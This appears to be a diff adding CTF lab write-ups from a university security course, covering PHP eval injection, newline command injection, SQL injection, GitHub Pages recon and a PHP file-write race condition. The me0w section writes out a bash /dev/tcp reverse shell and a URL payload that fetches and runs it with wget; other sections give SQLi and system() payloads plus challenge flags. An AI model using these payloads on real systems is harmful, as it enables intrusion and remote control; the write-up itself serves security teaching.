@@ -86,7 +86,7 @@ We can find the original data by the debugger.
 
 ### sub\_5D1270(const char \*a1)
 This function will copy some data to `v2` and execute it as a function.
-The data is the `data` mentioned in `sub_5D1070(char a1)`.
+The data is the data mentioned in `sub_5D1070(char a1)`.
 
 ```c
 ...
@@ -138,3 +138,139 @@ Thus, the `seed` should be `16`, and we can get the function instructions.
 ```
 
 We know `unk_5D4018`, and we can just reverse the calculation and get the flag.
+
+
+## [Lab 0x03] sushi
+`web, 50 pts` `FLAG{HaoChihDeSuSiZaiJhengSian}`
+
+> 好ㄘ的蘇洗宰爭先
+> 
+> BGM: https://www.youtube.com/watch?v=uDeqxWRRKGk
+> 
+> [Link](https://edu-ctf.csie.org:10152/)
+
+The php shows that it take `$_GET['🍣']` as input and pass it to `die()`.
+
+```php
+# cat index.php
+<?php
+// PHP is the best language for hacker
+// Find the flag !!
+highlight_file(__FILE__);
+$_ = $_GET['🍣'];
+
+if( strpos($_, '"') !== false || strpos($_, "'") !== false )
+    die('Bad Hacker :(');
+
+eval('die("' . substr($_, 0, 16) . '");');
+```
+
+There is a php magic `$msg = "${@phpinfo()}"`.
+We can requeset `https://edu-ctf.csie.org:10152/?🍣=${@system(ls)}` and get file names.
+
+```
+flag_name_1s_t00_l0ng_QAQQQQQQ index.php phpinfo.php
+```
+
+We can not use `${@system(cat flag_name_1s_t00_l0ng_QAQQQQQQ)}` because we can only input string length under 16.
+But we can access the file directly through `https://edu-ctf.csie.org:10152/flag_name_1s_t00_l0ng_QAQQQQQQ` and get the flag.
+
+
+## [Lab 0x03] me0w
+`web, 50 pts` `FLAG{me0w!m3ow!meow!}`
+
+> 喵🐱🐈
+> 
+> [Link](https://edu-ctf.csie.org:10153/)
+
+It is common to know that you can use `%0A` as a delimiter.
+I use `curl` to verify that this is work.
+
+The first thought is to use `nc` to create a reverse shell.
+However, there is no `nc` on the server.
+I want to use `bash -i >& /dev/tcp/<ip>/<port> 0>&1` to creat reverse shell,
+but we can not use `>` and `&` because of the filter.
+
+
+It comes to mind that
+I can use `wget` to download the file with the cmd to the server,
+and execute it on the server.
+
+First, create file server by `python -m http.server <port1>`.
+
+```bash
+bash -i >& /dev/tcp/$1/$2 0>&1
+```
+
+Then create  listen port with `nc -vv -l -p <port2>`
+and query
+
+```
+https://edu-ctf.csie.org:10153/?me0w=index.php%0awget%20<ip>:<port1>/revshell.sh%20-O%20/tmp/revshell.sh%0abash%20/tmp/revshell.sh%20<ip>%20<port2>%0a
+```
+
+
+
+## [Lab 0x03] No Password
+`web, 50 pts` `FLAG{baby_first_sqlinj}`
+
+> Login as admin!
+> 
+> [Link](https://edu-ctf.csie.org:10154/)
+
+It's a simple SQLi, and the payload is shown on the page.
+Both username and password input `a" or "a"="a`.
+
+
+## [0x03] Unexploitable
+`web, 100 pts` `FLAG{baby_recon_dont_forget_to_look_github_page}`
+
+> Exploit the unexploitable!
+> 
+> [Link](https://unexploitable.kaibro.tw/)
+
+There is nothing useful Javascript, Cookies, or Headers.
+Try to identify which type of web backend is used,
+and find out that this is an static page `https://unexploitable.kaibro.tw/index.html`.
+Try to access `.git` or `.index.swp`
+and find out that this is an GitHub Pages by the error page.
+
+By the document of [Github Page](https://help.github.com/en/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site),
+we can use `dig WWW.EXAMPLE.COM +nostats +nocomments +nocmd` to find original github page.
+
+```
+; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> unexploitable.kaibro.tw +nostats +nocomments +nocmd
+;; global options: +cmd
+;unexploitable.kaibro.tw.       IN      A
+unexploitable.kaibro.tw. 2993   IN      CNAME   bucharesti.github.io.
+bucharesti.github.io.   2993    IN      A       185.199.110.153
+bucharesti.github.io.   2993    IN      A       185.199.108.153
+bucharesti.github.io.   2993    IN      A       185.199.109.153
+bucharesti.github.io.   2993    IN      A       185.199.111.153
+```
+
+Access `github.com/bucharesti` and there is nothing related to the `flag`.
+Maybe the file had been deleted.
+Try to find it in the commits,
+and find out that there is an commit called `delete secret file`.
+The flag is in the file.
+
+
+## [0x03] Safe R/W
+`web, 200 pts` `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`
+
+> I implemented the safest php file reader/writer!
+> 
+> Hack me if you can :p
+> 
+> Ps. open_basedir=/var/www/html/
+> 
+> [Link](https://edu-ctf.csie.org:10155/)
+
+First, the content length can be easily bypass with `c[]` instead of `c`.
+We send normal and illegal payload at the same time to trigger race condition.
+
+```bash
+$ ./race.py | $ ./race.py '<?php system("ls -al /")'
+$ ./race.py | $ ./race.py '<?php system("cat /flag_is_here")'
+```
